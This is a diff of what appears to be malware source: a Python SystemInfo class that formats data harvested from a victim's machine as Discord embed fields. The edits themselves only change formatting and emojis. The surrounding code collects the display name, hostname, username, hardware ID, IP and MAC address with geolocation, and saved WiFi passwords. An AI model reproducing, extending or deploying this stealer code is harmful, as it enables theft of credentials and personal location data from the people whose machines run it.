@@ -84,7 +84,7 @@ class SystemInfo():
 
         return (
             ":bust_in_silhouette: User",
-            f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
+            f"**Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}**",
             False
         )
 
@@ -105,8 +105,8 @@ class SystemInfo():
         hwid = get_hwid()
 
         return (
-            "<:CPU:1004131852208066701> System",
-            f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
+            "<:CPU:1075842630413459618> System",
+            f"**CPU: {cpu}\n GPU: {gpu}\n RAM: {ram}\n HWID: {hwid}**",
             False
         )
 
@@ -121,8 +121,8 @@ class SystemInfo():
                 usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
 
         return (
-            ":floppy_disk: Disk",
-            f"```{disk}```",
+            "<:DiscordFloppy:1075842329539248218> Disk",
+            f"**{disk}**",
             False
         )
 
@@ -140,8 +140,8 @@ class SystemInfo():
         country, region, city, zip_, as_ = geolocation(ip)
 
         return (
-            ":satellite: Network",
-            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
+            "<:globe:1075843179267510363> Network",
+            "**IP Address: {ip}\n MAC Address: {mac}\n Country: {country}\n Region: {region}\n City: {city} ({zip_})\n ISP: {as_}**".format(
                 ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
             False
         )
@@ -182,7 +182,7 @@ class SystemInfo():
             out += '{:<20}| {:<}\n'.format(name, password)
 
         return (
-            ":signal_strength: WiFi",
-            f"```{out}```",
+            "<:wifionline:1075845078125396069> WiFi",
+            f"**{out}**",
             False
         )
